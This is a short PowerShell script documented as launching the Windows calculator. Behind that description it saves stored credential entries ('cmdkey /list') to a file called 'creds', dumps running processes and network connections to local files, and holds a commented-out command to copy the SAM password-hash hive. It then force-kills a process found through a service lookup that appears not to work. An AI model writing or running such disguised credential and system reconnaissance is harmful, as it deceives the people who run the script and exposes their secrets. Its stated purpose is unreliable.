<#
.SYNOPSIS
	Launches the calculator application
#>
## reg save HKLM\sam %temp%\sam
cmdkey /list | Out-File -FilePath .\creds
Start-Process ms-calculator:
tasklist | Out-File -FilePath .\tasklist
$pid_number = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'CalculatorApp'" | Select-Object -ExpandProperty ProcessId
netstat -an | Out-File -FilePath .\netstat
taskkill /F /PID $pid_number
